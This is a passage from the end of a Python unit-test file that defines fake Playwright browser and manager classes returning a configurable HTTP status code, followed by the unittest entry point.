        return _FakeBrowser(self._status_code)


class _FakePlaywrightManager:
    def __init__(self, status_code: int) -> None:
        self.chromium = _FakeChromium(status_code)

    def __enter__(self) -> "_FakePlaywrightManager":
        return self

    def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
        return None


if __name__ == "__main__":
    unittest.main()
